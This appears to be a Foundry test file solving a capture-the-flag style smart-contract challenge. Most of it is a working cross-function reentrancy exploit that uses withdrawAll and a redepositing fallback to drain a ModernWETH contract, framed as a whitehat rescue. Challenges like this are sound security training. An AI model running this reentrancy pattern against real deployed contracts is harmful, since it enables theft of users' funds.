// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        
        //here cross function reentrancy possible
        // _burnAll doesn't check how much amount to be burn
        //we will transfer token before _burnAll()

        Exploit exploiter = new Exploit(modernWETH,whitehat);
        modernWETH.deposit{value: 10 ether}();
        while(modernWETH.balanceOf(whitehat)< 1010 ether){
            modernWETH.transfer(address(exploiter), modernWETH.balanceOf(whitehat));
            exploiter.attack();
        }

        modernWETH.withdraw(1010 ether);
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}

contract Exploit {
    ModernWETH public modernWETH;
    address whitehat;
    constructor (ModernWETH _targetContract, address _whitehat){
        modernWETH = _targetContract;
        whitehat = _whitehat;
    }

    function attack() external payable{
        //we cannot use withdraw() as it call _burn()
        //and in _burn() => require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        
        modernWETH.withdrawAll();
    }
    fallback() external payable{
        modernWETH.deposit{value: msg.value}();
        modernWETH.transfer(whitehat, modernWETH.balanceOf(address(this)));
        console.log("after---:",modernWETH.balanceOf(whitehat)/10**18);
    }
}